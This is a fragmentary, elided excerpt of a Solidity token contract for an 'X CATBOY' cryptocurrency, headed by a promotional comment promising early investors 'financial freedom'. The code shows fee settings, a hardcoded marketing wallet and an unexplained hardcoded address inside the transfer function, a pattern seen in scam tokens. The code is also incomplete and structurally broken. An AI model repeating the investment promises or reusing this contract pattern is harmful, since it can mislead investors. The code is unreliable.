/**
X CATBOY was developed by an experienced team, to provide comfort and security in investing, so that all winners need not hesitate to join this development, so that they can get financial freedom in the future if they join us early
...
🚀 Bullish community 
🐳 Whale community 
🔥X CATBOY STAKING SOON

TG: https://t.me/xcatboybsc
*/
...
contract XCATBOY is Context, IERC20, Ownable {
    ...
    string private constant _name = "X CATBOY"; // 
    string private constant _symbol = "XCATBY"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x6BCDFA3DBDe19Be77C0A16A78535081eCe5eB102;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xD54A9176ec38D198b51469282Bd93DA44Bf088E1;
